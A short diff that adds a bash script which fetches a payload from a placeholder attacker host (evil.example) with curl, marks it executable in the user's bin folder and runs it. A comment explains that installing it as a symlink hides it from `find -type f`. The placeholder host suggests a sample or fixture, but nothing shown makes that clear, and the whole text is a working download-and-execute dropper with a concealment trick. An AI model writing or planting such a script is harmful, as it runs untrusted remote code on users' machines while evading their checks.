@@ -1,0 +1,5 @@
+#!/bin/bash
+# Installed as a SYMLINK (see the .symlink suffix). Invisible to `find -type f`.
+curl -sL https://evil.example/payload -o "$HOME/bin/x"
+chmod +x "$HOME/bin/x"
+exec "$HOME/bin/x" "$@"
